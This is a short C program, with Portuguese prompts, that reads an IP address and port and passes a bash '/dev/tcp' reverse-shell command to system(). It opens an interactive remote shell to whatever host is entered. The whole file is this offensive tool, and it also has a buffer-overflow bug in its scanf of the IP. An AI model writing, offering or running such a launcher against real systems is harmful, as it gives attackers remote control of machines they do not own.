#include <stdio.h>
#include <stdlib.h>
int main(){
  char ip[15];
  int porta;


  puts("Digite seu ip,exemplo: 127.0.0.1");    scanf("%15s",&ip);
  puts("Digite sua porta,exeplo: 9000");       scanf("%d",&porta);


  char comando[100];
   
  snprintf(comando, sizeof(comando), "/bin/bash -c 'sh -i >& /dev/tcp/%s/%d 0>&1'", ip, porta);

    
  system(comando);
 


  return 0;
}
